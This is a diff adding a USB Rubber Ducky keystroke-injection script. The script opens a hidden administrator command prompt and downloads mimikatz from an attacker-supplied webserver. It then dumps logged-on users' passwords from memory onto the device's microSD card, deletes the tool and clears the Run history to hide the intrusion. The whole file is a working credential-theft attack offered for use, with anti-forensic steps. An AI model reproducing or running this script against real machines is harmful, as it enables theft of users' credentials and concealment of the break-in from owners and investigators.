@@ -1,0 +1,39 @@
+REM mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs)
+REM ==========
+REM Wait a bit for the computer to detect the dk as a keybord
+DELAY 3000
+REM Start an admin cmd
+GUI r
+DELAY 100
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 500
+REM Obfuscate the command prompt
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+DELAY 300
+REM Downoad mimikatz from ur webserver
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<your servername>/mimikatz.exe','%TEMP%\mimikatz.exe')
+DELAY 300
+ENTER
+DELAY 300
+REM exec mimikatz and save the output on the microSD card
+STRING %TEMP%\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> G:\mimikatz_output.txt
+ENTER
+DELAY 300
+REM Delete mimikatz
+STRING del %TEMP%\mimikatz.exe
+DELAY 300
+ENTER
+REM clear the history
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+REM and we finish
+STRING exit
+ENTER
+
